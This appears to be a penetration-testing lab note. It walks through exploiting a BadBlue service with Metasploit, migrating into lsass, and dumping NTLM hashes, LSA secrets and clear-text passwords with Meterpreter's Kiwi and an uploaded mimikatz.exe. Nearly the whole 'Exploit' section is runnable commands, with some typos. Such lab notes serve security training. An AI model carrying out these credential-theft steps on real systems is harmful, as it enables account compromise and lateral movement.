Dumping hashes with mimikatz
- Mimikatz is a Windows post-exploitation tool written by Benjamin Delpy .It allows for the extraction of clear-text passwords,hashes and kerberos tickets form memory
- The sam (Security Account Manager) database,is a database file on Windows system that stores hashed user passwords
- Mimikatz can be used to extract hashes from the lsass.exe process memory where hashes are cached
- We can utilize the pre-compiled mimikatz executabl,alternatively,if we have access to a meterpreter sessions on a Windows target,we can utilize the inbuilt meterpreter extension Kiwi.
#### Note
Mimikatz will required elevated privileges in order to run correctly.

#### Exploit
- nmap -sV 10.2.18.199
- service postgresql start
- msfconsole
- search badblue [ as service running on badblue]
- use 1
- set everything requires
- this will give us meterpreter session
- pgrep lsass
- migrate 788 [ 788 found from previous command,this will give us highest authority NT AUTHORITY\SYSTEM ]
- load kiwi
- ? [ help menu for meterpreter ]
- creds_all [ retrieve all the credentials ]
- lsa_dump_sam [ downlaod all NTLM hashes ]
- lsa_dump_secrets 
- now using same meterpreter session go to C:\\
- mkdir Temp [ Create Temp directory ]
- upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe [ upload the mimikatz file ]
- shell [ for getting a shell ]
- .\mimikatz.exe [ this will give us mimikatz terminal ]
- privilege::debug [ for checking privileges,if it return privileges 20 ok,then privileges are ok ]
- lsadump::sam [ this will dump hashes,it requires to session running of wiki ]
- sekurlsa:logonpasswords [ this will also show the passwords ]

